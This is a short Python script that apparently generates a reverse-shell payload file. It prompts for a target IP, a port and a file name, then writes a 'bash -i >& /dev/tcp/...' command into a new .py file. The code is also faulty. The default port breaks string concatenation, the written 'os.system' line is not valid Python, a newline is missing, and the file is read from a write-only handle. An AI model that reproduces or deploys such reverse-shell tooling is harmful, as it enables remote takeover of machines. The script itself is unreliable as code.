import os
import sys
import time
import random
import subprocess



addr = input("Target IPv4 address (ex: 10.10.10.10): ")
prt = input("\n Target port enter for default(10000): ")
name = input("Payload name")

file_path = name + ".py"
if prt == "":
  prt = 10000

payload = "bash -i >& /dev/tcp/" + addr + "/" + prt + " 0>&1"

try:
  with open(file_path, 'w') as file:
      file.write("import sys\nimport os\nimport time\nimport random")
      file.write("os.system" + payload)
  print(f"File '{file_path}' created successfully, containing: " + file.read())

except:
  print("Unable to create file")


